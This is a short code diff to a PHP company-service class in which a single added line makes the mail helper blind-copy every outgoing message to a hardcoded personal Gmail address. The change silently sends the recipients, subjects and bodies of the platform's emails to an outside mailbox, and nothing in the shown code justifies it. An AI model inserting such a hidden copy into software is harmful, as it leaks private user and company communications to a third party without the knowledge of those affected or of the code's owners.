@@ -557,6 +557,7 @@ class Service_Company extends Service_PlatformBase {
         ]);
 
         $mailer = new Helpers_Mailer();
+        $mailer->addBCC("ravipatel96013@gmail.com");
         $mailer->sendMail("{$appName} <{$fromEmail}>", $to, $subject, $body);
     }
 
